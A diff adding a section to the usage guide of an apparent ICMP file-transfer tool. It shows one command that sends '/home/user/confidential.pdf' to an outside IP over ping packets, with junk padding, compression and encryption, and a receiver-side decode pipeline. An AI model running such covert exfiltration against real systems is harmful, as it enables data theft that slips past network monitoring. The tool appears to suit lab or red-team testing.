@@ -183,3 +183,26 @@ ping-f-transfer transfer -f '/tmp/data.bin' -i 10.10.14.5 \
   --capture-packets-filename packets.hex \
   --decoded-filename recovered_data.bin
 ```
+
+---
+
+## All flags combined
+
+Using every available flag in a single command:
+
+```bash
+ping-f-transfer transfer -f '/home/user/confidential.pdf' -i 10.10.14.5 \
+  -p 0.01 -r 0.003 \
+  --junk 2 --randomize-junk \
+  --compress \
+  --encrypt aes-128 --random-passphrase 32 \
+  --capture-packets-filename capture_all.hex \
+  --decoded-filename recovered.pdf \
+  --no-banner
+```
+
+**Decode on receiver:**
+
+```bash
+LC_ALL=C sort -u capture_all.hex | grep -v '^ff' | cut -c7- | xxd -r -p | openssl enc -d -aes-128-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'<GENERATED_PASSPHRASE>' | gunzip > recovered.pdf
+```
